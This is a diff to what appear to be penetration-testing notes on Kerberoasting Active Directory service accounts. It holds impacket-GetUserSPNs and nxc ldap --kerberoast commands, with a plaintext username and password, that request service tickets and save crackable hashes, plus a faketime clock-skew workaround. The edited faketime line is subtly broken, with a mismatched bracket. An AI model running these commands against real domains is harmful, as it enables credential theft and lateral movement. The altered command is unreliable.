@@ -151,8 +151,17 @@ impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 - Sometimes the `impacket-GetUserSPNs` might be unable to get the tickets due to time. Simple fix-:
 
 ```bash
-sudo faketime "$(rdate -n <domain-ip> | cut -d ' ' -f 1,2)"
+sudo faketime "$(rdate -n <domain-ip)" <binary>
 ```
+
+- Kerbroasting with nxc-:
+
+```bash
+sudo faketime "$(sudo rdate -n 192.168.232.129)"  nxc ldap  192.168.232.129  -u 'stafani.ferdinanda' -p 'ncc1701' --kerberoast kerberoast.hashes
+```
+
+<img width="1736" height="736" alt="image" src="https://github.com/user-attachments/assets/8a1d9bdd-df75-4884-aa0c-2ae963a44afd" />
+
 --------------
 
 ### Using Windows for kerberoasting( Semi Manual mode)
